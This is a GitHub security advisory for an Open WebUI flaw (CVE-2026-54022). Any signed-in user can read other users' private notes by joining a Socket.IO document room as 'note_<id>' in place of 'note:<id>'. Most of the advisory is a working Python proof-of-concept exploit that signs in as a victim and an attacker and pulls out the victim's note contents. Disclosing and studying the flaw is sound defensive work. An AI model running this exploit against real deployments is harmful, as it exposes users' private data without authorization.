# [M] Open WebUI: Any authenticated user can read other users' private notes via Socket.IO

## Summary
Severity: Medium
Advisory: GHSA-8788-j68r-3cgh
CVE: CVE-2026-54022
CWE: CWE-706, CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-8788-j68r-3cgh
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.8.11

## Details
### Summary

The `ydoc:document:join` Socket.IO handler checks note ownership only when the `document_id` starts with `note:` (colon). However, the `YdocManager` storage layer normalizes all document IDs by replacing colons with underscores (`document_id.replace(":", "_")`). An attacker can join a document room using `note_<id>` (underscore) instead of `note:<id>` (colon), bypassing the authorization check entirely while accessing the same underlying Yjs document. The server then returns the full document state, leaking the victim's private note contents.

### Details

The `ydoc:document:join` handler in `socket/main.py` (line 511) only performs authorization for document IDs matching the `note:` prefix:

```python
@sio.on("ydoc:document:join")
async def ydoc_document_join(sid, data):
    document_id = data["document_id"]

    if document_id.startswith("note:"):
        note_id = document_id.split(":")[1]
        note = Notes.get_note_by_id(note_id)
        # ... ownership and AccessGrants check ...
        # Returns early if user doesn't have access

    # If document_id does NOT start with "note:", execution continues
    # with no authorization check at all

    await YDOC_MANAGER.add_user(document_id=document_id, user_id=sid)
    await sio.enter_room(sid, f"doc_{document_id}")

    ydoc = Y.Doc()
    updates = await YDOC_MANAGER.get_updates(document_id)
    for update in updates:
        ydoc.apply_update(bytes(update))

    state_update = ydoc.get_update()
    await sio.emit("ydoc:document:state", {
        "document_id": document_id,
        "state": list(state_update),
    }, room=sid)
```

The `YdocManager` class in `socket/utils.py` normalizes document IDs in every method by replacing colons with underscores:

```python
async def get_updates(self, document_id: str) -> List[bytes]:
    document_id = document_id.replace(":", "_")  # line 176
    # ... returns updates keyed by normalized ID

async def append_to_updates(self, document_id: str, update: bytes):
    document_id = document_id.replace(":", "_")  # line 134
    # ... stores update keyed by normalized ID
```

This means `note:abc123` and `note_abc123` resolve to the same storage key (`note_abc123`). When a victim opens their note, the Yjs document is stored under the normalized key. An attacker can then request the same document using the underscore variant, which skips the `startswith("note:")` authorization check but retrieves the same data from `YdocManager`.

### PoC

```python
#!/usr/bin/env python3
"""
uv run --no-project --with requests --with "python-socketio[asyncio_client]" --with aiohttp --with pycrdt finding_15_yjs_note_disclosure.py --base-url BASE_URL --attacker-email EMAIL --attacker-password PASS --victim-email EMAIL --victim-password PASS

Finding #15 — Any authenticated user can read other users' private notes via Socket.IO

SUMMARY:
  The ydoc:document:join Socket.IO handler only checks authorization for
  document IDs starting with "note:" (colon). However, YdocManager normalizes
  document IDs by replacing colons with underscores internally. An attacker
  can join a room using "note_<id>" (underscore) to bypass the auth check,
  while still accessing the same underlying Yjs document as "note:<id>".
  Then ydoc:document:state returns the full document content.

VULNERABLE CODE:
  backend/open_webui/socket/main.py, ydoc:document:join:
    if document_id.startswith("note:"):
        # permission check only for colon-prefix
    # "note_<id>" skips this check entirely

  backend/open_webui/socket/ydoc.py, YdocManager:
    key = document_id.replace(":", "_")  # normalizes to same storage key

IMPACT:
  Any authenticated user can read the full content of any other user's notes
  by exploiting the namespace collision between "note:" and "note_" prefixes.

REPRODUCTION:
  1. Victim creates a private note with sensitive content.
  2. Attacker connects via Socket.IO and authenticates.
  3. Attacker joins room with document_id "note_<victim_note_id>" (underscore).
  4. Attacker requests ydoc:document:state to get the full note content.

REQUIREMENTS:
  - Running Open WebUI instance
  - A victim note with content
  - Attacker user (any authenticated user)
"""

import argparse
import asyncio
import sys
import requests
import socketio


async def victim_initialize_note(base, victim_token, note_id):
    """Simulate victim opening the note in the UI to initialize the Yjs document."""
    sio = socketio.AsyncClient()

    await sio.connect(
        base,
        socketio_path="/ws/socket.io",
        headers={"Authorization": f"Bearer {victim_token}"},
        transports=["websocket"],
    )

    # Join using the proper note:id format (passes auth check since victim owns it)
    doc_id = f"note:{note_id}"
    print(f"    Joining as victim with document_id: {doc_id}")

    await sio.emit("ydoc:document:join", {
        "document_id": doc_id,
        "user_id": "victim",
        "user_name": "Victim",
    })
    await asyncio.sleep(1)

    # Send a Yjs update with the note content
    # Create a simple Yjs document with text content
    try:
        import pycrdt as Y
        ydoc = Y.Doc()
        ytext = ydoc.get("default", type=Y.Text)
        with ydoc.transaction():
            ytext += "# Private Notes\n\nPassword for production DB: p@ssw0rd_pr0d_2026\nAWS root account: admin@company.com / SuperSecret!23\n\nDo NOT share this with anyone."
        update = ydoc.get_update()

        await sio.emit("ydoc:document:update", {
            "document_id": doc_id,
            "update": list(update),
        })
        print(f"    Sent Yjs update with note content ({len(update)} bytes)")
    except ImportError:
        # If pycrdt not available, try y-py
        try:
            import y_py as Y
            ydoc = Y.YDoc()
            ytext = ydoc.get_text("default")
            with ydoc.begin_transaction() as txn:
                ytext.extend(txn, "# Private Notes\n\nPassword for production DB: p@ssw0rd_pr0d_2026\nAWS root account: admin@company.com / SuperSecret!23\n\nDo NOT share this with anyone.")
            update = txn.get_update()

            await sio.emit("ydoc:document:update", {
                "document_id": doc_id,
                "update": list(update),
            })
            print(f"    Sent Yjs update with note content ({len(update)} bytes)")
        except ImportError:
            print("    WARNING: Neither pycrdt nor y-py available, sending raw text marker")
            # Send a minimal marker that we can detect
            raw_update = list(b"\x01\x00\x00\x00\x00\x00\x00SECRET_NOTE_CONTENT_MARKER")
            await sio.emit("ydoc:document:update", {
                "document_id": doc_id,
                "update": raw_update,
            })

    await asyncio.sleep(1)
    await sio.disconnect()
    print(f"    Victim disconnected")


async def exploit(base, attacker_token, victim_note_id):
    sio = socketio.AsyncClient()
    result = {"state": None, "error": None, "joined": False}

    @sio.on("ydoc:document:state")
    async def on_state(data):
        result["state"] = data
        print(f"    [!] Received ydoc:document:state event!")
        print(f"        document_id: {data.get('document_id', '?')}")
        state = data.get("state", [])
        print(f"        State size: {len(state)} bytes")

    @sio.on("error")
    async def on_error(data):
        result["error"] = data
        print(f"    [!] Error event: {data}")

    @sio.on("*")
    async def catch_all(event, data):
        if event not in ("ydoc:document:state", "error"):
            print(f"    [debug] Event: {event} Data: {str(data)[:200]}")

    # Connect with auth token
    print(f"[*] Connecting as attacker to Socket.IO...")
    await sio.connect(
        base,
        socketio_path="/ws/socket.io",
        auth={"token": attacker_token},
        transports=["websocket"],
    )

    # Join with "note_" prefix (underscore — bypasses auth)
    bypass_doc_id = f"note_{victim_note_id}"
    print(f"\n[*] Step 3: Joining room with bypassed document_id: {bypass_doc_id}")
    print(f"    (using underscore instead of colon to skip auth check)")

    await sio.emit("ydoc:document:join", {
        "document_id": bypass_doc_id,
        "user_id": "attacker",
        "user_name": "Attacker",
    })

    result["joined"] = True

    # Wait for state response (from join handler's emit)
    for _ in range(20):
        await asyncio.sleep(0.5)
        if result["state"]:
            break

    await sio.disconnect()
    return result


def main():
    parser = argparse.ArgumentParser(description="Finding #15: Yjs note disclosure via namespace collision")
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--attacker-email", required=True)
    parser.add_argument("--attacker-password", required=True)
    parser.add_argument("--victim-email", required=True)
    parser.add_argument("--victim-password", required=True)
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    # ── Step 1: Login as victim and find their note ──
    print("[*] Authenticating as victim...")
    r = requests.post(f"{base}/api/v1/auths/signin",
                      json={"email": args.victim_email, "password": args.victim_password})
    if not r.ok:
        print(f"[-] Victim login failed: {r.status_code}")
        sys.exit(1)
    victim_token = r.json()["token"]
    victim_id = r.json()["id"]
    print(f"[+] Logged in as victim (id={victim_id})")

    r = requests.get(f"{base}/api/v1/notes/", headers={"Authorization": f"Bearer {victim_token}"})
    if not r.ok:
        print(f"[-] Failed to list victim notes: {r.status_code}")
        sys.exit(1)
    notes = r.json()
    if isinstance(notes, dict):
        notes = notes.get("items", notes.get("data", []))
    if not notes:
        print("[-] No victim notes found")
        sys.exit(1)
    victim_note = notes[0]
    victim_note_id = victim_note["id"]
    print(f"[+] Victim's note: {victim_note.get('title', '?')} (id={victim_note_id})")

    # ── Step 2: Login as attacker ──
    print(f"\n[*] Authenticating as attacker...")
    r = requests.post(f"{base}/api/v1/auths/signin",
                      json={"email": args.attacker_email, "password": args.attacker_password})
    if not r.ok:
        print(f"[-] Attacker login failed: {r.status_code}")
        sys.exit(1)
    attacker_token = r.json()["token"]
    attacker_id = r.json()["id"]
    print(f"[+] Logged in as attacker (id={attacker_id})")

    # ── Step 3: Confirm attacker CANNOT read victim's note via API ──
    print(f"\n[*] Step 1: Confirming attacker cannot read victim's note via API...")
    r = requests.get(f"{base}/api/v1/notes/{victim_note_id}",
                     headers={"Authorization": f"Bearer {attacker_token}"})
    if r.status_code in (401, 403, 404):
        print(f"[+] Access correctly DENIED via /api/v1/notes/{victim_note_id} (HTTP {r.status_code})")
    else:
        print(f"[!] Unexpected: attacker can read note (status {r.status_code})")

    # ── Step 4 & 5: Victim opens note, attacker reads it concurrently ──
    async def combined_exploit():
        # Victim opens note and stays connected
        print(f"\n[*] Step 2: Victim opens note (stays connected)...")
        victim_sio = socketio.AsyncClient()
        await victim_sio.connect(
            base,
            socketio_path="/ws/socket.io",
            auth={"token": victim_token},
            transports=["websocket"],
        )
        doc_id = f"note:{victim_note_id}"
        await victim_sio.emit("ydoc:document:join", {
            "document_id": doc_id,
            "user_id": "victim",
            "user_name": "Victim",
        })
        await asyncio.sleep(1)

        # Send Yjs update with note content
        try:
            import pycrdt as Y
            ydoc = Y.Doc()
            ytext = ydoc.get("default", type=Y.Text)
            with ydoc.transaction():
                ytext += "# Private Notes\n\nPassword for production DB: p@ssw0rd_pr0d_2026\nAWS root account: admin@company.com / SuperSecret!23\n\nDo NOT share this with anyone."
            update = ydoc.get_update()
            await victim_sio.emit("ydoc:document:update", {
                "document_id": doc_id,
                "update": list(update),
            })
            print(f"    Sent Yjs update ({len(update)} bytes)")
        except Exception as e:
            print(f"    WARNING: Could not create Yjs update: {e}")

        await asyncio.sleep(1)

        # Now attacker joins while victim is still connected
        result = await exploit(base, attacker_token, victim_note_id)

        # Clean up victim connection
        await victim_sio.disconnect()
        return result

    result = asyncio.run(combined_exploit())

    if not result["joined"]:
        print(f"\n[-] Failed to join document room")
        sys.exit(1)

    if result["state"]:
        state_data = result["state"]
        state_bytes = bytes(state_data.get("state", []))

        # Try to extract readable text from the Yjs state
        # Yjs binary format contains the text as embedded strings
        text_content = ""
        try:
            # Search for readable ASCII strings in the binary data
            current_str = ""
            for b in state_bytes:
                if 32 <= b < 127:
                    current_str += chr(b)
                else:
                    if len(current_str) > 5:
                        text_content += current_str + " "
                    current_str = ""
            if len(current_str) > 5:
                text_content += current_str
        except Exception:
            pass

        print(f"\n[+] Extracted text from Yjs state:")
        print(f"    {text_content[:500]}")

        # Check for sensitive markers
        sensitive_markers = ["p@ssw0rd", "SuperSecret", "Private Notes", "production DB", "AWS root"]
        found = [m for m in sensitive_markers if m.lower() in text_content.lower()]

        if found:
            print(f"\n[+] SUCCESS: Victim's note content LEAKED via Yjs namespace collision!")
            print(f"    Sensitive markers found: {found}")
            print(f"    The attacker joined room 'doc_note_{victim_note_id}' (underscore)")
            print(f"    which bypasses the auth check (only checks 'note:' colon prefix)")
            print(f"    but accesses the same Yjs document due to normalization.")
            sys.exit(0)
        elif text_content.strip():
            print(f"\n[+] SUCCESS: Note content retrieved (markers may differ)")
            print(f"    Non-empty Yjs state was returned for victim's note.")
            sys.exit(0)
        else:
            print(f"\n[*] Yjs state was returned but could not extract readable text.")
            print(f"    Raw state size: {len(state_bytes)} bytes")
            if len(state_bytes) > 10:
                print(f"    First 50 bytes: {list(state_bytes[:50])}")
                print(f"[+] SUCCESS: Non-trivial document state returned")
                sys.exit(0)
            sys.exit(1)
    else:
        print(f"\n[-] No document state received")
        print(f"    The Yjs document may not exist in storage yet.")
        print(f"    Notes must be opened in the UI to create a Yjs document.")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

### Impact

Any authenticated user can read the full contents of any other user's private notes. Notes are a collaborative editing feature intended for personal or shared use --  private notes may contain sensitive information such as credentials, internal documentation, or personal data. The attacker only needs to know or enumerate the target note's ID.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-8788-j68r-3cgh
- https://nvd.nist.gov/vuln/detail/CVE-2026-54022
- https://github.com/advisories/GHSA-8788-j68r-3cgh
- https://github.com/open-webui/open-webui
- https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-2712.yaml
- https://pypi.org/project/open-webui
